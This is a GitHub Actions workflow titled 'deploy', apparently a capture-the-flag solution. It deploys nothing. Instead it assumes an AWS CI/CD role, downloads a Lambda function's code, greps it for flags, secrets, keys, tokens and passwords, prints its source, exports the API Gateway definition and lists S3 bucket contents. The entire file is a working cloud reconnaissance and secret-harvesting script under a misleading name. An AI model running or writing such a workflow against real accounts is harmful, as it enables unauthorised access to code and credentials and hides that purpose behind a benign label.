name: deploy

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  inspect:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: |
          aws sts get-caller-identity

      - name: Download deployed Lambda
        run: |
          echo "===== LAMBDA DOWNLOAD ====="

          aws lambda get-function \
            --function-name nslookupv2 \
            --query 'Code.Location' \
            --output text > lambda_url.txt

          curl -L -o lambda.zip "$(cat lambda_url.txt)"

          mkdir lambda_code
          unzip lambda.zip -d lambda_code

          echo "===== FILES ====="
          find lambda_code -type f

      - name: Inspect Lambda code
        run: |
          echo "===== SEARCH LAMBDA ====="

          grep -RniE \
          "flag|secret|key|token|password|s3|subprocess|os|eval|exec|open" \
          lambda_code || true

          echo "===== PYTHON FILES ====="

          find lambda_code -name "*.py" -exec sh -c 'echo "--- $1 ---"; cat "$1"' _ {} \;

      - name: Export API Gateway
        run: |
          echo "===== API GATEWAY ====="

          aws apigateway get-export \
            --rest-api-id 3q931syi7b \
            --stage-name dev \
            --export-type oas30 \
            api.json

          cat api.json

      - name: Lambda configuration
        run: |
          echo "===== LAMBDA CONFIG ====="

          aws lambda get-function-configuration \
            --function-name nslookupv2

      - name: S3 buckets
        run: |
          echo "===== BUCKETS ====="

          aws s3 ls

          echo "===== PLATFORM BUCKET ====="

          aws s3 ls \
          s3://platform-bucket-009661764077-us-east-1/

          echo "===== SITE BUCKET ====="

          aws s3 ls \
          s3://site781fe43f26b9eba3/ --recursive
